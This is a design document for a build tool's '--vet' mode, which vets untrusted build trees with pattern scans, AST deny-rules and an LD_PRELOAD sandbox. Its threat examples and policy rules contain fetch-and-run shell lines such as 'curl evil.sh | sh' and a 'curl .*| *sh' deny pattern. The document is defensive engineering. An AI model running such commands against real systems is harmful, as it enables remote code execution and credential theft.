# Build veto and sandbox — vetting and containing an untrusted build

Status: **design** (one tier-A veto is implemented in `lib/agent` /
`tools/aeb-agent`; the rest is design). Companion to
[`run-policy-class-and-cloud-leverage.md`](run-policy-class-and-cloud-leverage.md)
(the sovereign-agent + policy-class design) and
[`directions.md`](directions.md) (where this sits in the rings).

> **Renamed from `veto-alternates.md` and broadened.** The original was
> "how a remote `aeb-agent` decides via `maybe_veto_build`." This doc keeps
> all of that (the agent is the sharpest case — it builds *internet-supplied*
> trees) but recasts it as a **general aeb capability**: an opt-in launch
> mode (`aeb --vet …` and `aeb-agent --vet …`) that **vets the build and
> can veto it in a way the untrusted `.ae` script and source set cannot
> override.** Same mechanism whether the untrusted tree arrived by dispatch
> or is just a repo you don't fully trust.

## Why aeb itself is a supply-chain surface

The motivating threat (sharpened by the June-2026 npm wave —
binding.gyp "Phantom Gyp" execution, preinstall/postinstall credential
harvesters, self-spreading worms that target CI/CD secrets and even inject
backdoors into AI coding assistants): **an attacker who controls the build
description gets code execution at *build time* on the agent or dev box.**
For aeb the build description is the `.build.ae` graph, every `.ae` it
imports, and anything in the source set a build step reads (a `binding.gyp`,
a vendored `package.json` with a `postinstall`, a `regen` that shells out).
aeb is not immune by being Aether-native — a malicious `.build.ae` can
`os.system("curl … | sh")`, declare `extern syscall`, or reach the network
just as a malicious `package.json` can.

So aeb needs to be able to **treat its own build input as untrusted**, on
demand. That is what `--vet` is.

(Disambiguation: the policy-class doc also says "veto", but that's the
*token/claim* veto — refusing an unauthenticated or over-scoped dispatch at
the door. This doc is the *build-content* veto — having prepared the tree,
does policy permit *this build* to run. Two different gates: auth-veto at the
door, build-veto after prepare.)

## The load-bearing invariant — the veto runs in the trusted harness

The single property everything here depends on:

> **The veto and the sandbox are enforced by the harness that *invokes* the
> build — not by anything the untrusted `.ae` graph can read, call, or
> re-declare.** A verdict reached by the trusted side cannot be overridden by
> the code it is about to compile or run.

This is why a `.build.ae` "self-certifying" is worthless, and why the
enforcement points are all *outside* the untrusted graph's reach:

- **1a/1b** (tree scan / external tool) run on the *source bytes*, before
  `ae` ever compiles them — the untrusted code has not executed.
- **2b** (AST analysis) is performed by **`ae` itself** (trusted compiler),
  on the typed AST, before the run-compile — the graph can't veto its own
  veto.
- **3** (sandbox) wraps the build via the container/contained split from
  [`../aether/docs/containment-sandbox.md`](../../aether/docs/containment-sandbox.md):
  the harness configures grants in a trailing block (full access); the
  untrusted build runs in a hoisted closure / a `spawn_sandboxed` child that
  **cannot reach the grant list** — it is structurally unable to widen its
  own permissions.

`--vet` is an operator decision at launch; a dispatch or a `.build.ae`
cannot clear it.

## The enforcement layers, end to end

You can use any subset; the strong build uses **1 + 2b + 3** (and 1 is
itself 1a + 1b). Earliest to latest in the build's life:

```
untrusted tree on disk
   │
   ├─[1a] regex / pattern scan of source bytes        (lib/agent _veto_run_rules — HAVE)
   ├─[1b] call an external tool on the source         (e.g. a python3 scanner — DESIGN)
   │        (semgrep, a CVE/secret scanner, a custom .py — exit code = verdict)
   │
   ae compile each .ae → .c
   │
   ├─[2a] grep the generated .c for symbol calls       (stopgap — DESIGN, no aether change)
   ├─[2b] ae AST analysis / deny-rules                 (the real one — UPSTREAM ASK)
   │        os.system / extern / un-allowlisted net — vetoed by the trusted compiler
   │
   gcc link → per-node orchestrator binary
   │
   └─[3]  spawn_sandboxed(grants, _ae_build_all, label)  (runtime containment — DESIGN)
            deny-by-default: no tcp, no cred env, exec allowlist
```

### Layer 1 — source scan (cheap, pre-compile). Two sub-forms.

**1a — regex / pattern scan (HAVE).** The `lib/agent` `_veto_run_rules`
engine: a data-driven `id\tscope\tpattern\treason` rule list over the tree
or the patch. Extend with the June-2026 patterns — a `binding.gyp` present
in the tree, `preinstall`/`postinstall` in a vendored manifest, a literal
`curl … | sh`, an `extern` line in a user `.ae`. **Strength:** catches the
blatant, requester can't disable. **Limit (load-bearing, see the policy/
containment section):** bounded by what it can read as *text* — defeated by
`"os"+".system"`, base64, runtime-fetched payloads. A tripwire, not a wall.

**1b — call an external tool on the source (DESIGN).** Rather than only
aeb-internal regex, `--vet` can shell out to a **dedicated scanner** the
operator chooses — a `python3` script, `semgrep`, a secret/CVE scanner, an
org's house tool — passing it the tree/patch path; **non-zero exit = veto.**
This is the pragmatic escape hatch: aeb doesn't try to be a SAST engine, it
*invokes* one. Same trusted-harness invariant (the tool runs in the harness,
not in the build). The tool itself is attack surface and must be a pinned,
operator-controlled binary — not something pulled from the untrusted tree.

### Layer 2 — structural / AST inspection. The `.c` vs the AST question.

The key design question you raised: inspect the **generated `.c`** or the
**Aether AST**?

- **2a — grep the generated `.c` (stopgap, no aether change).** After
  `ae file.ae → file.c`, scan the C for `os_system(` / `*_connect(` /
  `dlopen(` symbol calls. Better than 1a (sees post-codegen calls regardless
  of how the Aether string was spelled) but **wrong altitude**: C conflates
  user intent with emitted runtime scaffolding, and you've lost which
  *import* / which user-vs-SDK code a call came from. Usable today; noisy.
- **2b — AST analysis: `ae` emits, *aeb* decides (the real answer).** The
  compiler already builds a typed, name-resolved AST (`AST_FUNCTION_CALL`,
  `AST_EXTERN_FUNCTION`, `AST_IMPORT_STATEMENT`). The split:
  - **aether's job (upstream ask, `../aether/veto-enhancements.md`):** one
    generic primitive — **`aetherc --emit=ast`** — that dumps the
    name-resolved AST as stable JSON, each node carrying `kind`/`file`/`line`
    and, for calls, the **resolved callee symbol** (e.g. `os_system`
    regardless of how the receiver was spelled — aliasing/concat can't dodge
    a resolved binding; that's why this beats regex and 2a). Reusable beyond
    veto (`aeb query`/`rdeps` want it too).
  - **aeb's job (this repo):** own the **policy and the decision** — walk that
    AST against operator rules and veto. aeb does *not* push categories into
    the compiler; the deny/allow policy is an aeb-side out-of-tree policy
    `.ae` DSL (see "The policy surface" below). What aeb vetoes: any
    **`extern`** in the
    untrusted graph (the bypass the containment doc flags), `os.*` exec,
    un-allowlisted `tcp`/`http`, forbidden imports.

  This is **Tier C's intent ("read what the build would do") realized via the
  compiler's own AST instead of a doppelganger** — stronger than Tier C (sees
  *all* code, not just builder calls) and it keeps the veto logic in aeb's
  trusted `.ae`. It composes with the containment doc's "proposed fix:
  compiler-enforced extern check" — same node, `AST_EXTERN_FUNCTION` — but aeb
  applies it as *policy* rather than the compiler hardcoding it.
  **Recommended:** 2b is the real layer; **2a (`.c` grep) is the stopgap**
  until `--emit=ast` lands; **Tier C's `--lib` doppelganger** (below) is the
  aeb-only route that needs *no* aether change at all — a parallel path to the
  same "read the build's intent" goal, usable today.

### Layer 3 — runtime containment (the part the source set can't override)

Covered in depth in "Veto is policy; containment is enforcement" below. The
update for the post-`nodes-as-subprocesses` world: aeb no longer runs all
nodes in one `main()` — `tools/aeb-driver.ae` runs **each node as a
subprocess** (`_ae_build_all <root> <label>`). So `--vet` wraps **each
node-subprocess** in `spawn_sandboxed(grants, _ae_build_all, label)`: the
grant list lives in shared memory the node can't rewrite, `LD_PRELOAD`
propagates to the node's whole child tree (gcc, javac, …), and the node —
compiled from untrusted source — inherits a deny-by-default profile it
cannot widen. (Not a "secret wrapper `main()`" — the *driver* wraps the
node; same effect, cleaner seam, and it's per-node not per-whole-build.)

## The policy surface — an out-of-tree policy `.ae` (DSL), not a flag list

The deny/allow policy for layers 1 and 2b is **not** a CLI category-list
(`--deny extern,exec,…`) and **not** an external `deny.toml`. Both were
rejected:

- a CLI list is **typo-prone and fails open** — `--deny exce` silently
  enforcing nothing is the worst outcome for a security gate;
- an external config format violates aeb's founding rule (*the `.ae` file is
  the single source of truth; external formats only via shell-out*).

So the policy is an **aeb-native closure-DSL `.ae` file**, served by a new
`lib/veto` SDK — same *shape* as a `.build.ae`, but with one critical
difference in **where it lives and how aeb finds it.**

> **NOT a dot-prefixed in-tree target.** aeb scans every dot-prefixed `.ae`
> under cwd and makes it a DAG **node** ("filename is the route"). A policy
> must be the *opposite* of that — it polices the tree, so it must not be a
> node *in* the tree, and an untrusted dispatch must not be able to ship its
> own. So the policy file is **not** called `.veto.ae` next to `.build.ae`
> (an earlier draft of this doc implied that — it was wrong: aeb's scanner
> would slurp it into the graph, and the untrusted tree could supply it).
> Instead it is a **plainly-named `.ae` at an operator-trusted, out-of-tree
> location**, loaded *as policy* by `--vet`, never scanned as a target:
>
> - `aeb --vet --veto-policy /etc/aeb/policy.ae` (explicit operator path), or
> - `$AEB_HOME/veto/default.ae` (the shipped default), or
> - `.aeb/veto/policy.ae` (per-project, under the already-non-scanned `.aeb/`
>   config dir — same trusted space as the `.aeb/lib/<sdk>` symlinks).
>
> aeb must **refuse** a `--veto-policy` path that resolves inside the build
> tree (the requester writing their own exemption = gate dead). The filename
> is irrelevant *because it is not a target* — `policy.ae`, not a `.`-prefix.

```aether
// /etc/aeb/policy.ae (or $AEB_HOME/veto/default.ae) — operator policy.
// A normal .ae aeb compiles+runs AS POLICY — NOT a dot-prefixed build node.
// Lives outside the build tree; reviewed in PRs; version-controlled; typed.
import veto (policy, deny, allow_exec, allow_import, scope, default_grants)
main() {
    p = veto.policy()

    // --- layer 2b (AST) rules ---
    veto.deny(p, "extern")               // no raw C escapes in untrusted code
    veto.deny(p, "net")                  // no tcp/http reach
    veto.deny(p, "exec")                 // deny shell-out by default…
    veto.allow_exec(p, "gcc")            // …except the toolchain
    veto.allow_exec(p, "javac")
    veto.allow_exec(p, "/usr/bin/ld")
    veto.allow_import(p, "std.string")   // import allowlist; everything else denied

    // --- layer 1 rules (tree/source patterns) ---
    veto.deny(p, "file:binding.gyp")     // the Phantom-Gyp vector
    veto.deny(p, "pattern:curl .*| *sh") // curl|sh literal

    // --- layer 3 runtime grants (the deny-by-default sandbox profile) ---
    veto.default_grants(p)               // no tcp, no cred env, exec=allowlist above

    // --- scoping ---
    veto.scope(p, "untrusted")           // rules fire on the build tree, NOT --lib SDKs
}
```

Three properties this buys, each answering a requirement:

1. **Self-vetting / lint (the "what vets the vetter" answer).** The policy
   `.ae` *is Aether* — `aetherc` typechecks it when aeb compiles it. A malformed
   policy (`veto.dney(...)`, wrong arity, an unknown rule keyword the `veto`
   SDK rejects) is a **compile error**, not a silent empty policy. aeb adds a
   semantic lint on top: **`--vet` with a policy that resolves to zero rules is
   itself an error** (vet-requested-but-denies-nothing → refuse, never fall
   through). Fail-closed by construction.

2. **Outside the source tree (the security property).** The policy `.ae` is
   **operator-owned**, resolved from a trusted path (`$AEB_HOME/veto/` or an
   operator `--veto-policy <path>`), **never from the dispatched/untrusted
   tree**. aeb must *refuse* a policy path that resolves inside the build tree
   — otherwise the requester writes their own exemption and the gate is dead.
   Same provenance rule as the `--lib` SDK roots; same trust line as the
   project-vs-toolchain import split (`LLM.md`).

3. **Cached once compiled.** The policy `.ae` → compiled policy is a pure
   content-addressed build product (`lib/cache`): key on
   `sha256(policy.ae) + toolchain-version`, compile **once**, reuse until the
   policy source changes. `--vet` then costs one hash check, not a
   policy-recompile per build node. (The untrusted tree's emitted AST is
   likewise cacheable per-node on its source hash.)

### How the DSL lowers

The policy `.ae` is the *front end*; the enforcement primitives are the *back
end*. aeb compiles+runs the policy (the doppelganger move — a builder that populates
a rule map, exactly like a `.build.ae` populates a build map), producing a
resolved rule set, then:

- layer-1 rules → the `lib/agent` `_veto_run_rules` pattern engine + the 1b
  external-tool hook;
- layer-2b rules → applied against `aetherc --emit=ast` output (the upstream
  ask);
- layer-3 grants → the per-node `spawn_sandboxed` profile.

There is **no human CLI category surface** — `aeb --vet [--veto-policy <path>]`
is the whole launch interface; absent a policy file, the **built-in default**
fires (deny `extern`/`net`, allow the toolchain `exec` set) so the safe thing
happens with zero config and `--vet` is never a silent no-op.

## SCOPE — read this first, it's the whole point

These vetoes guard against **build-grammar escapes**: things the
`.build.ae` / `.tests.ae` *orchestration* does that the agent operator
doesn't want a leased node to do — shell out to something dangerous, reach
the network, pull a banned/known-vulnerable dependency, write outside the
workdir, embed a secret in the tree, dispatch onward.

They do **NOT** guard against **the application being built being a trojan.**
Nothing here inspects, or can vouch for, the runtime behaviour of the
*compiled artifact*. A `.build.ae` that cleanly runs `javac` on Java source
passes every veto in this doc — and that Java can still be malware. The
veto sees *the build's intent*, not *the program's intent*.

Stated bluntly so no one mistakes it:

> **In scope:** "this *build* would `curl evil.sh | sh`, or link a CVE'd
> dependency, or write to `/etc`." → vetoable here.
>
> **Out of scope:** "the binary this build produces exfiltrates data when
> run." → NOT addressed here. That needs artifact scanning / SBOM /
> sandboxed *execution* of the output, which is a different problem with
> different (and weaker) guarantees.

Conflating the two is how a veto framework manufactures false confidence.
A green `maybe_veto_build` means *the build process was acceptable to the
agent operator* — it says nothing about whether the software is safe to
run. Keep that line bright.

## Veto is policy; containment is enforcement — they are different layers

Before the tiers: be clear about what the veto *is*. `maybe_veto_build` is a
**policy gate** — it inspects (the tree, the resolved closure, a recorded
trace) and *decides* whether to proceed. Every tier in this doc is a thing
the agent *reads and reasons about* before letting the build run.

That makes the veto fundamentally **bounded by what it can read.** Tier C's
honest-limits section already says it: a `.build.ae` doing
`os.system(decode(blob))` records `os.system(<computed string>)` — the veto
can flag opacity as policy, but it *cannot read what would actually run.* A
build that *computes* `curl evil.sh | sh` at runtime is invisible to every
tier here. That is not a gap to be closed by a smarter veto; it is the
nature of a read-and-decide gate.

The thing that *does* close it is **containment** — enforcing limits on the
running build at a layer it cannot reason its way around. aeb's leased agent
has **three containment surfaces**, stacked as defense in depth, each
catching what the layer above is blind to:

| Layer | Mechanism | Catches | Blind to |
|---|---|---|---|
| **Veto** (policy; in-process, pre-build) | `maybe_veto_build` tiers A/B/C | *Declared / readable* build-grammar escapes | Computed/opaque escapes; the compiled artifact |
| **Aether sandbox** (per-process; `LD_PRELOAD`) | `spawn_sandboxed(grants, "aeb", target)` | *Runtime* fs/exec/tcp/env attempts by the build **and its children** — including computed ones the veto couldn't read | A statically-linked tool that bypasses libc; the artifact's later behaviour |
| **Container / OS** (kernel namespaces, caps, netns) | `itests/agent-container` hardening | Everything that escapes the preload — kernel-level blast radius | (this is the floor) |

The middle layer is the one this section exists to capture, because it is
**already implemented upstream in Aether and aeb has not yet consumed it**
(LLM.md's scope table lists "Sandboxing / isolation" as a TODO — "Aether's
runtime sandbox is per-process, not per-build-step." The finding below is
that per-process is *enough*, because the build's children inherit it).

### The Aether sandbox primitive — `spawn_sandboxed` + the grandchild finding

Aether ships a runtime containment sandbox (`runtime/aether_sandbox.c`,
`runtime/aether_spawn_sandboxed.c`, `runtime/libaether_sandbox_preload.c`;
demos in the Aether tree at `examples/sandbox-demo.ae` /
`examples/sandbox-spawn.ae`). Two shapes:

- **In-process** — `run_sandboxed(perms) |ctx| { ... }` installs a permission
  checker for the current process; stdlib `fs`/`os`/`net` calls consult it
  transparently (the contained code uses *normal* stdlib and "should not know
  for sure it is contained" — a denied read is indistinguishable from
  file-not-found).
- **Cross-process** — `spawn_sandboxed(grants, program, arg) -> exit_code`
  forks, serialises the grant list into POSIX shared memory, sets
  `LD_PRELOAD=libaether_sandbox.so` + `AETHER_SANDBOX_SHM=<name>` in the
  child's env, and `execlp`s. The preload intercepts libc `open` / `fopen` /
  `connect` / `execve` / `getenv` (and `mmap`/`mprotect`/`dlopen`) and checks
  each against the grants before calling through.

Grants are `(category, pattern)` pairs with glob/prefix matching:
`fs_read`, `fs_write`, `exec`, `tcp`, `tcp_listen`, `env` (and `*`/`*` for
grant-all). E.g. `grant_fs_read("/etc/*")`, `grant_fs_write("/tmp/worker/*")`,
`grant_exec("echo *")`, `grant_tcp("api.example.com")`.

**The finding that makes this useful for the agent:** because
`spawn_sandboxed` sets `LD_PRELOAD` and `AETHER_SANDBOX_SHM` as **environment
variables** in the child before `execlp`, and the `execve` interceptor
re-checks every subsequent exec against the same shared-memory grants, the
sandbox **propagates to the entire process subtree.** If the agent spawns
`aeb` sandboxed, then `aeb → gcc → cc1`, `aeb → javac`, etc. all run under
the *same* grant list, each `connect()`/`open()`/`execve()` checked. So
"per-process, not per-build-step" understates it: **one `spawn_sandboxed` of
`aeb <target>` contains the whole build subtree.** That is precisely the
per-build-step isolation the roadmap wanted, available today.

This is also why the sandbox covers the veto's blind spot. A build that
*computes* `curl 1.2.3.4 | sh` defeats tier C's trace (the command is opaque)
— but the `connect(1.2.3.4)` is a real syscall, and the preload's `connect`
interceptor denies it regardless of how the command string was built. **Policy
can be fooled by opacity; the LD_PRELOAD interceptor sees the actual
syscall.** The veto and the sandbox are not redundant — the sandbox is what
makes "a clean veto is not a clean program" survivable.

### How the agent would wire it (design — not implemented)

In `tools/aeb-agent.ae`, the accepted-build path today is:

```
cmd = "cd '${workdir}' && aeb '${target}'"
rc = os.system(cmd)
```

The sandboxed shape replaces the `os.system` with a `spawn_sandboxed` whose
grant list is **the agent operator's policy** (the same authority that owns
the veto rules — see the policy-class doc), derived from flags/config:

```
grants = sandbox("preint-build") {
    grant_fs_read(repo)             // read the prepared tree
    grant_fs_read("/usr/*")         // toolchain + libs
    grant_fs_read("/lib/*")
    grant_fs_write(target_dir)      // write only build outputs
    grant_fs_write("/tmp/*")        // compilers stage here
    grant_exec("/usr/bin/*")        // the compiler allowlist (see constraints)
    // NO grant_tcp — see "network stance" below
}
rc = spawn_sandboxed(grants, "aeb", target)
```

### Constraints — state them or the layer will be over-trusted

1. **Linux-only.** `spawn_sandboxed` is `fork`/`shm_open`/`LD_PRELOAD`; on
   non-Linux it returns `-1` with a clear message. The agent container is
   Debian, so this is fine *there* — but a macOS/BSD agent host gets no
   cross-process sandbox and must fall back to the container/VM layer.
2. **`exec` grants are by resolved path.** The interceptor checks the
   `execve` pathname against `exec` grants (prefix/glob). So the grant list
   must enumerate the toolchain — `grant_exec("/usr/bin/*")` or a tighter
   per-compiler allowlist. **Enumerating the toolchain correctly is the
   work**; too broad and it's no fence, too narrow and legitimate builds
   break. This enumeration *is* the policy.
3. **libc-level, not kernel-level.** A statically-linked binary, or one that
   issues raw syscalls bypassing libc, is **not** caught by the preload —
   that is what the container/namespace layer (below it) is for. The sandbox
   raises the cost of an escape; it is not a kernel jail.
4. **Not a substitute for the container.** It is the *middle* layer. A build
   the preload contains can still exhaust memory, fork-bomb, or fill the
   disk — `pids`/`memory`/`cpu` cgroup limits and a read-only rootfs live at
   the container layer, which is a separate hardening pass.

### Network stance for a leased `preint` build

**Default: no `tcp` grant at all.** A `preint` build leased to the agent
should get *zero network*. The common case justifies it: the agent owns the
origin and fetches the base tree itself (`_prepare_tree`'s
`git fetch origin` + `git checkout`), so the sources are already on disk
before the build runs; a compile-only build needs no socket. With no `tcp`
grant, the preload denies *every* `connect()` — which is exactly what closes
the computed-`curl|sh` hole at the syscall, no matter how the command was
constructed.

A build that *legitimately* needs the network (resolving Maven/npm/cargo
coordinates at build time rather than from a pre-populated cache, or reaching
an internal artifact mirror) is then the **explicit exception**: the operator
adds a `grant_tcp(<host-or-ip>)` allowlist for that dispatch. The allowlist
is itself attack surface, so the strong stance keeps it empty by default and
makes every entry a deliberate operator decision. (If/when this is tied to
the dispatch's policy class — `preint`=no-net, `ci`=allowlist — that is the
plumbing described in the policy-class doc; not designed here beyond the
default.)

## The veto pipeline: three complementary tiers

`maybe_veto_build(repo, target, purpose)` runs an ordered list of checks;
any one may refuse. They differ by *what they inspect* and *what they cost*.

### Tier A — tree scan (cheap, pre-everything)

Grep/inspect the prepared tree (post-checkout, post-patch) for obvious
red flags before any compile: committed secrets/private keys, banned
files, oversize trees, files outside an allowed set. Implemented today as
a single conservative example (a `BEGIN RSA PRIVATE KEY` marker scan) — the
placeholder seam. Fast, dumb, catches the blatant. A hit on the *patch*
specifically is the highest-signal case (the untrusted pre-integration
delta introduced it).

### Tier B — resolved-coordinate / SBOM meta (the dependency-CVE tier)

Inspect the **resolved third-party closure** — the exact
`group:artifact:version` set aeb already computes (`aeb-resolve.jar` /
pnpm / cargo / NuGet) plus the `build.dep(...)` edge graph aeb extracts
statically (`tools/extract-deps`, `target/_aeb/_edges.txt`). A veto here
asks "does this build pull a known-vulnerable or banned dependency?" —
against structured coordinates, NOT a regex over `pom.xml`. This is where
OWASP-style dependency checks live. aeb *already produces* most of the
input; it needs a resolve-only / meta-emit mode so the veto can read the
closure without doing a full build. (See the "structured outputs" item in
TODO.md § Test result reporting for the adjacent plumbing.)

### Tier C — doppelganger-compile trace (the build-grammar-intent tier)

**The interesting one, and the one this doc exists to capture.** Compile
the target against a *doppelganger* `build` / `aether` / language SDK that,
instead of *executing* the build, **records what the build would do** — its
`os.system` calls, `dep()` edges, `link_flag`s, `extra_source`s, codegen,
any `std.net`/`std.http` reach. The veto then inspects that **structured
recorded intent** ("this build would `os.system('curl …')`", "would link
`libsketchy.so`", "would reach 1.2.3.4") rather than regexing source.

#### Why aeb can do this cheaply (the Action!/Interface-Builder trick)

This is the same move as Denison Bollay's Action! (1988): interpret the
*same source* into an *alternate context* — and Paul's tsyne WYSIWYG
designer, which interprets a `.ts` UI script into a doppelganger Tsyne API
that records widget metadata instead of drawing widgets
(`tsyne/designer`). Provenance:
- Action! — paulhammant.com 2013-03-28, "Interface Builder's Alternative
  Lisp timeline": *"saved in Lisp, and interpreted the same on load … into
  a context."*
- tsyne designer — `designer/README.md`: *"the designer interprets the
  to-be-designed .ts script into designer's own emulation of Tsyne's
  TypeScript API."*

The tsyne designer pays an **impedance cost** for the trick: it
`tsc`-transpiles the script then *regex-rewrites the transpiled output* to
swap `require("tsyne")` → `global.designer` (fragile — it depends on how
`tsc` happens to emit import aliases; see `designer/src/server.ts`
~1057–1098). **aeb pays no such cost.** Which SDK an `.ae` imports is
purely the `--lib` search path — so swapping in a doppelganger is just
`aetherc --lib <doppelganger-lib>`. Same source, different library, **zero
source/output rewriting.** aeb has, via `--lib`, the clean "interpret into
an alternate context" that the homoiconic Lisp case had natively and the
TypeScript case has to fake. The pieces already exist: multi-`--lib`
resolution (the `aeblabel`/`AEB_COMPILE_LIB` work) and the
`maybe_veto_build` seam to host the trace inspection.

#### What tier C is, precisely — and its honest limits

It is **dynamic abstract interpretation of the build orchestration.** It
faithfully traces *what the `.build.ae` declares/reaches on the path taken*.
It is **not** a soundness proof, and three limits must be stated or it will
be over-trusted:

1. **Orchestration only, never the app.** Tier C sees "the build runs
   `javac` on these files" — never what the *compiled Java* does. (This is
   the SCOPE boundary above, restated at the mechanism level. The whole
   doppelganger sees the build-grammar layer; the trojan-in-the-output is
   invisible to it by construction.)
2. **One path, not all paths.** A `.build.ae` with `if env(X) { sys(a) }
   else { sys(b) }` records the branch *this run* takes. You get *a* trace,
   not *every* trace — the standard dynamic-analysis limitation. Sound
   coverage would need symbolic/abstract walking, a much larger thing.
3. **Opaque computation defeats understanding (but not detection).** A
   `.build.ae` doing `os.system(decode(blob))` records
   `os.system(<computed string>)` — the veto can still flag "opaque/
   computed command → veto" as policy, but it cannot always *read* what
   would run. Treat opacity itself as a vetoable signal.

So tier C is a **strong veto input for build-grammar escapes**, not a
guarantee. "The build declared nothing I forbid, on the path it took" — a
real, useful statement, within its stated limits.

## How the tiers compose

```
maybe_veto_build(repo, target, purpose):
  A. tree scan            (raw tree; cheap; pre-compile)        — implemented (stub)
  B. resolved-dep / SBOM  (structured coordinates; needs resolve) — design
  C. doppelganger trace   (--lib swap; records build intent)      — design
  → first refusal wins → {status:"vetoed", reason}; no build runs
```

- Run cheap→expensive (A, then B, then C) so a blatant tier-A hit short-
  circuits before the costly resolve/doppelganger work.
- The veto **list is pluggable** — each tier is N rules; OWASP/CVE is a
  tier-B rule, "no network reach" / "no shell-out outside an allowlist" are
  tier-C rules, "no committed secret" is a tier-A rule. New rules slot in
  without reshaping `maybe_veto_build`.
- Veto rules are **the agent operator's policy**, not the requester's — and
  may be keyed by the dispatch's policy class (a `ci` dispatch stricter
  than a `preint` one), per the policy-class doc.
- A vetoed dispatch is **a refusal, not a build failure** — distinct
  status (`vetoed`, HTTP 422), so the originator can tell "your build was
  refused on policy" from "your build ran and failed."

## What to build, in order

0. **The `--vet` launch mode + the policy surface** — the shared seam. A flag
   on `aeb` and `aeb-agent` (operator-set; a dispatch/`.build.ae` can't clear
   it) that turns on layers 1/2/3 against the build's own tree, driven by an
   out-of-tree policy `.ae` (the `lib/veto` SDK; loaded via `--veto-policy`,
   NOT a dot-prefixed in-tree target) or the built-in default — *no CLI
   category-list*. Policy is operator-trusted (outside the build tree),
   self-vetting (it's Aether → typechecks), and content-addressed-cached after
   compile. For the agent the seam is `maybe_veto_build` already; for non-agent
   `aeb` it's new. Build `lib/veto` + the default policy first — everything
   below lowers onto it.
1. ~~**Tier A / layer 1a is in.** Generalize the single stub scan into a small
   rule list.~~ **DONE (2026-06-05).** `lib/agent` `_veto_run_rules`: a
   data-driven rule list (`id\tscope\tpattern\treason`), built-in secret/key
   markers + an AWS-key rule scoped to the patch, operator-extensible via
   `AEB_AGENT_VETO_PATTERNS`, per-rule `tree`/`patch` scope. **Next on 1a:** add
   the June-2026 patterns (a `binding.gyp` in the tree, `pre/postinstall` in a
   vendored manifest, `curl|sh` literal, `extern` in a user `.ae`), plus a tree
   **size cap** and **patch-touches-disallowed-path** rule kind.
2. **Layer 1b — external-tool hook.** `--vet-tool <cmd>`: run an operator-chosen
   scanner (python3 / semgrep / a CVE-or-secret tool) on the tree/patch;
   non-zero exit vetoes. Small, high-leverage — aeb invokes a SAST engine
   rather than becoming one.
3. **Layer 3 — per-node `spawn_sandboxed`.** Wrap each node-subprocess
   (`_ae_build_all <root> <label>`) in a deny-by-default grant profile (no
   tcp, no cred env, exec allowlist) when `--vet` is on. **Highest value vs.
   the June-2026 credential-harvest threat** — it dies at the libc boundary
   regardless of how the build computed the exfil. Linux-first (macOS/BSD fall
   back to the container layer).
4. **Layer 2b — `aetherc --emit=ast` (upstream ask) + aeb-side AST walk.**
   Filed: `../aether/veto-enhancements.md` asks the sibling for one generic
   primitive — emit the name-resolved AST as stable JSON (per-node
   `kind`/`file`/`line` + resolved callee symbol), fail-closed exit. aeb's
   `lib/veto` policy walks it and decides — aeb owns categories/scoping, not
   the compiler. (Stopgap 2a — `.c` grep — usable meanwhile, no aether change.)
5. **Tier C spike** — the `--lib` doppelganger that records build intent
   (`os.system`/`dep`/`link_flag`/codegen) instead of executing; the aeb-unique
   route to "read the build's intent" with no aether change. Parallel to 2b.
6. **Tier B** — a `--resolve-only`/meta-emit mode exposing the resolved
   coordinate closure to a CVE/banned-dep veto without a full build; OWASP-style
   check as the first tier-B rule.

## The one-line summary

`maybe_veto_build` guards the **build's behaviour**, tier C does it with the
Action!/designer "interpret into a doppelganger via `--lib`" trick (cheap
in aeb because `--lib` swaps the library with no impedance) — but it guards
**build-grammar escapes, never the application being built.** A clean veto
is not a clean program. Keep that boundary bright.

And remember the veto is only the *policy* layer: it decides on what it can
read. The thing that survives a build it *can't* read — a computed escape, an
opaque command — is **containment**, and Aether's `spawn_sandboxed` is the
already-shipped middle layer that contains the whole `aeb <target>` subtree
at the libc boundary, with the container/namespace layer below it. Veto +
sandbox + container, stacked — not the veto alone.
